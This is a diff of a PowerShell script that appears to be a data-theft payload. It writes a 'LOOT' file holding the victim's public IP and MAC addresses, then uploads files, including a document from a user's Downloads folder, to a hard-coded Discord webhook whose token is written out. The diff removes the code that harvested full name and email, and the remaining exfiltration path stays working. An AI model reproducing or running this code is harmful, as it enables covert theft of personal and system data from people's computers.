@@ -1,37 +1,6 @@
 # Define variables
 $FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
 
-# Function to get full name
-function Get-FullName {
-    try {
-        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
-    }
-    catch {
-        Write-Error "No name was detected"
-        return $env:UserName
-    }
-    return $fullName
-}
-
-# Function to get email
-function Get-Email {
-    try {
-        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
-        if (-not $email) {
-            throw "No email address found"
-        }
-        return $email
-    }
-    catch {
-        Write-Error "An email was not found"
-        return "No Email Detected"
-    }
-}
-
-# Invoke functions to populate variables
-$fullName = Get-FullName
-$email = Get-Email
-
 # Get public IP address
 try {
     $computerPubIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
@@ -54,9 +23,6 @@ $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" |
 
 # Construct output string
 $output = @"
-Full Name: $fullName
-
-Email: $email
 
 Public IP: 
 $computerPubIP
@@ -117,7 +83,7 @@ function Upload-DiscordFile {
         [string]$FilePath,
 
         [Parameter(Mandatory = $false)]
-        [string]$Message
+        [string]$Message = "File upload"  # Default message if none provided
     )
 
     try {
@@ -144,11 +110,10 @@ function Upload-DiscordFile {
         Write-Error "Failed to upload file to Discord webhook: $_"
     }
 }
-
-# Example usage:
 $webhookUrl = "https://discord.com/api/webhooks/1261009752851484692/B1wpTxDAqPn0aLB8pwU4FH4j1i5iAWFC86__R0DBuiMn96cbFZcx8SWPFTLEOBf-DXb8"
 $filePath = "C:\Users\ameer\Downloads\SuperSecretDoc.txt"
 $message = "Here is the file upload!"
 
 Upload-DiscordFile -WebhookUrl $webhookUrl -FilePath $filePath -Message $message
+
 
